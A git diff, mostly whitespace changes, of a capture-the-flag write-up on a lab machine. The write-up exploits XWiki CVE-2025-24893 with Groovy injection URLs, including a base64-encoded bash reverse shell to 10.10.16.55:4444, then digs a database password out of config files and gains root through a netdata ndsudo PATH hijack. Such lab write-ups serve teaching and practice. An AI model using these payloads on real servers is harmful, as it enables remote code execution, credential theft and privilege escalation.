@@ -77,7 +77,6 @@ Last-Modified: Sun, 15 Jun 2025 06:18:30 GMT
 Connection: keep-alive
 ETag: "684e65b6-277"
 Accept-Ranges: bytes
-
 ```
 
 
@@ -100,13 +99,11 @@ A quick search for a CVE we find lots of CVEs:
 So, reading more on `CVE-2025-24893` in [here](https://nvd.nist.gov/vuln/detail/CVE-2025-24893), We're on the right path. Confirming using:
 ```
 http://wiki.editor.htb/xwiki/bin/get/Main/SolrSearch?media=rss&text=%7D%7D%7D%7B%7Basync%20async%3Dfalse%7D%7D%7B%7Bgroovy%7D%7Dprintln%28%22Hello%20from%20search%20text%3A%20%22%20%2B%20%2823%2B19%29%29%7B%7B%2Fgroovy%7D%7D%7B%7B%2Fasync%7D%7D
-
 ```
 
 Which decodes to this:
 ```java
 }}}{{async async=false}}{{groovy}}println("Hello from search text: " + (23+19)){{/groovy}}{{/async}}
-
 ```
 
 This will print out:
@@ -115,12 +112,10 @@ This will print out:
 So, the target is indeed vulnerable and we can gain RCE. Let's test for some system commands:
 ```
 http://wiki.editor.htb/xwiki/bin/get/Main/SolrSearch?media=rss&text=%7D%7D%7D%7B%7Basync%20async%3Dfalse%7D%7D%7B%7Bgroovy%7D%7Dprintln%28%22Result%3A%20%22%20%2B%20%22id%22.execute%28%29.text%29%7B%7B%2Fgroovy%7D%7D%7B%7B%2Fasync%7D%7D
-
 ```
 Which decodes to this:
 ```java
 }}}{{async async=false}}{{groovy}}println("Result: " + "id".execute().text){{/groovy}}{{/async}}
-
 ```
 
 Which successfully executes the `id` command:
@@ -131,13 +126,11 @@ Here is the payload i used:
 
 ```
 http://wiki.editor.htb/xwiki/bin/get/Main/SolrSearch?media=rss&text=%7D%7D%7D%7B%7Basync%20async%3Dfalse%7D%7D%7B%7Bgroovy%7D%7D%22bash%20-c%20%7Becho%2CYmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMC4xMC4xNi41NS80NDQ0IDA%2BJjE%3D%7D%7C%7Bbase64%2C-d%7D%7C%7Bbash%2C-i%7D%22.execute%28%29%7B%7B%2Fgroovy%7D%7D%7B%7B%2Fasync%7D%7D
-
 ```
 Which decodes to this:
 
 ```
 http://wiki.editor.htb/xwiki/bin/get/Main/SolrSearch?media=rss&text=}}}{{async async=false}}{{groovy}}"bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi41NS80NDQ0IDA+JjE=}|{base64,-d}|{bash,-i}".execute(){{/groovy}}{{/async}}
-
 ```
 >Note that without the base64 encoding, the rev shell doesn't hit back. You could use `BusyBox` rev shell too. Find your way.
 {: .prompt-warning }
@@ -166,23 +159,21 @@ Furethermore I searched for notes, config files, sql database using:
 
 ```bash
 for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done 
-
 ```
 
  Looking for database files: 
 
 ```bash
-
 for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done
 ```
 - Looking for Notes: 
 
 ```bash
 find /home/* -type f -name "*.txt" -o ! -name "*.*"
-
 ```
 
 - Looking for scripts: 
+
 ```bash
 for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done
 ```
@@ -204,7 +195,6 @@ tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      
 Connecting to the db using the command below lead to nothing as we don't have a password: 
 ```bash
 mysql -u xwiki -h 10.10.11.80
-
 ```
 
 Now, the mistake in the `for` loop to look for config files didn't include `.cfg` files, which was the correct extension to the `xwiki` service:
@@ -237,7 +227,6 @@ cat /etc/xwiki/hibernate.cfg.xml | grep password
     <property name="hibernate.connection.password">xwiki</property>
     <property name="hibernate.connection.password">xwiki</property>
     <property name="hibernate.connection.password"></property>
-
 ```
 
 And we got the `xwiki` user password of `MySQL` database.
@@ -282,8 +271,6 @@ find /opt/netdata -perm -4000 2>/dev/null
 /opt/netdata/usr/libexec/netdata/plugins.d/ioping
 /opt/netdata/usr/libexec/netdata/plugins.d/nfacct.plugin
 /opt/netdata/usr/libexec/netdata/plugins.d/ebpf.plugin
-
-
 ```
 
 Okay some plugins with `SUID`. I looked GTFO bins. None.
@@ -336,7 +323,6 @@ Variables given as {{variable}} are expected on the command line as:
   --variable VALUE
 
 VALUE can include space, A-Z, a-z, 0-9, _, -, /, and .
-
 ```
 
 So, our goal is to add a malicious binary of our choice to the `PATH` variable, since this `ndsudo` is using the system path variables.
@@ -375,7 +361,6 @@ scp nvme oliver@editor.htb:~/evilsal/nvme
 
 ```bash 
 export PATH=$HOME/evilsal:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
-
 ```
 4. Now, simply run the the `ndsudo` with the `nvme-list` option:
 ```bash 
